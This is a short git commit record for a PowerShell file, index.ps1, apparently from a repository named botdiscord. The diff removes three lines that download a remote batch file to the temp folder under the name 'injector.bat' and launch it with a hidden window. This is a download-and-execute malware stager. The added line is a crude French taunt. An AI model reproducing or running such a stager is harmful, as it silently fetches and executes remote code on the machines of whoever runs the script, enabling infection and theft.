165580d2dcd5fa728e95b06231d6d196243a8d8f
kyara.sls <102626807+IStrawI@users.noreply.github.com>
2024-01-27 12:30:05 +0100

    Update index.ps1

--- index.ps1
+++ index.ps1
@@ -1,3 +1,1 @@
-iwr -useb https://raw.githubusercontent.com/IStrawI/botdiscord/main/sam.bat -o $env:TEMP\injector.bat
-Start-Sleep -s 1
-saps $env:TEMP\injector.bat -WindowStyle Hidden
+tu es gay si tu es la
